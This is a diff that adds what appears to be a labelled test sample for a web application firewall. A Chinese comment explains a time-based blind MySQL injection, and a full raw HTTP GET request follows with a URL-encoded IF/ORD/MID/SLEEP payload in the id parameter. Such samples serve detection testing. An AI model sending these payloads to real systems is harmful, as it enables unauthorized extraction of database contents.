@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入-06506266
+# 基于延时注入,该SQL注入语句的攻击目的是通过通过获取数据库的第一个字符来检测该字符是否等于字母"w"。它使用IF条件和ORD(MID(database(),1,1))函数来取得数据库名称的第一个字符的ASCII值。如果该字符是"w"，则使用SLEEP(3)函数使查询暂停3秒钟。否则，返回0。该攻击手段可以用于探测数据库名称的第一个字符，并通过观察查询响应时间来判断是否数据库名称以"w"开头。通过逐个字符重复执行类似的注入查询，攻击者可以逐步推断出整个数据库名称。这可能会导致未经授权的访问、数据泄露和其他安全问题。
+GET /?id=1%20and%20if%28ord%28mid%28database%28%29%2C1%2C1%29%29=119%2Csleep%283%29%2C0%29&bid=hd_tag_m8mv24cn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24cn
+RM-PRO-Token: 4cb78e38b818a96eaa0a59aa284481ba
+RM-PRO-Time: 1742808374831
+User-Agent: curl/7.83.1
+
